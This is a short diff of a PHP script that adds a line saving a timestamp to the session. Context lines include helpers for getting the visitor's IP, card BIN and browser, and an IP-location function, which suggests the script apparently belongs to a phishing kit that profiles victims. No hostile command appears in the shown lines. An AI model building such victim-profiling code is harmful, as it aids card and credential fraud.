@@ -7,7 +7,7 @@ $TIME_DATE = date('H:i:s d/m/Y');
 include('../../functions/get_ip.php');
 include('../../functions/get_bin.php');
 include('../../functions/get_browser.php');
-
+$_SESSION['TIME_DATE'] = $TIME_DATE;
 //
 function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
     $output = NULL;
